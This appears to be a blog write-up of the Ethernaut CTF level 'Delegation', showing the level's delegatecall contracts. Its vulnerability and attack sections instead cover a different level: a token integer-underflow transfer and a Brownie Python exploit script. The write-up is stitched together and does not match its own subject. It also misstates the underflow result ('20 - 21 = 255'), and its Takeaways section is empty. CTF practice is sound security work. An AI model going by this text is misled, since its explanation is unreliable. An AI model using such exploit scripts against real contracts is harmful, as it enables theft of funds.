---
title: Ethernaut - Level 06 - Delegation
date: 2022-09-16
---
{{<figure src="../images/delegation-6.svg" caption="Image courtesy of OpenZeppelin">}}
## Ethernaut 06 - Delegation
This level from Ethernaut, Delegation, is about a special Solidity method called `delegatecall()`. To complete this level we must understand how this low level function works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```




## Where is the vulnerability?


```solidity {lineos=table,hl_lines=[2],lineofstart=1}
  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0); // _value >= 21
    balances[msg.sender] -= _value; // 20 - 21 = 255
    balances[_to] += _value; // 0 + 21 = 21
```

## Hacking the contract


```python {lineos=table,hl_lines=[5,10,12],lineofstart=1}
from brownie import accounts, config, interface

def attack(token, hacker, fake_account):
    print(f'Balance before attack: {token.balanceOf(hacker)}')
    tx = token.transfer(fake_account, 21, {'from': hacker, 'allow_revert':True})
    tx.wait(2)
    print(f'Balance after attack: {token.balanceOf(hacker)}')

def main(target):
    token = interface.TokenInterface(target)
    hacker = accounts.add(config['wallets']['from_key'])
    fake_account = "0x00000000000000000000000000000000cafebabe"

    attack(token, hacker, fake_account)
```


## Takeaways
